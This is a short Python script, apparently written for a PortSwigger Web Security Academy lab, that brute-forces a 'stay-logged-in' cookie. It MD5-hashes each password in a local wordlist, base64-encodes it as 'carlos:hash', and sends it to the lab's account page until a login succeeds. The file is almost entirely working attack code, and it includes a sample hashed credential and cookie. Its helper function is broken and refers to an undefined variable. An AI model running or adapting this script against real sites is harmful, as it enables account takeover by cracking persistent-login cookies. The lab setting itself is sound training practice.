import requests
from hashlib import md5
import base64


def encrypt_credential(username, password):
    md5_password = md5(password.encode()).hexdigest()
    credential = f"{username}:{md5_password}"
    return base64.b64encode(cookie.encode()).decode()


url = "https://ac9a1fb11fefc8c98031508100250036.web-security-academy.net/my-account"

"wiener:51dc30ddc473d43a6011e9ebba6ca770"

with open("/Users/trieulieuf9/Desktop/ctf/portswigger_academy/passwords.txt", "r") as passwords:
    for i, password in enumerate(passwords):
        password = password.strip()
        print(i, password)
        md5_password = md5(password.encode()).hexdigest()
        cookie = f"carlos:{md5_password}"
        cookie_encoded = base64.b64encode(cookie.encode()).decode()
        cookies = {'stay-logged-in': cookie_encoded}
        # print(cookies)
        response = requests.get(url, cookies=cookies)
        if "Your username is" in response.text:
            print(f"found it: {password}")



# cookies = {'stay-logged-in': 'd2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw'}



